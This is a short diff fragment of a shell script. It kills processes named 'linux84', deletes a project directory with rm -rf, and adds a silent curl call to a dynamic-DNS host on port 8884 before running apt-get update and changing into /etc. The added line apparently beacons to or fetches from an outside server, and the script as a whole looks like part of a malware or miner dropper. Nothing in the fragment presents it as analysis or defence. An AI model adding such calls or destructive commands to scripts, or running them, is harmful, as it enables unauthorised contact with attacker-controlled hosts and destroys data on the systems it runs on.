@@ -9,6 +9,8 @@ pkill -f linux84
 
 rm -rf /mnt/disks/user/project/linux8474/
 
+curl -s http://linux84.distro.cloudns.cl:8884/linuxgoogle84.php
+
 apt-get update
 
 cd /etc/
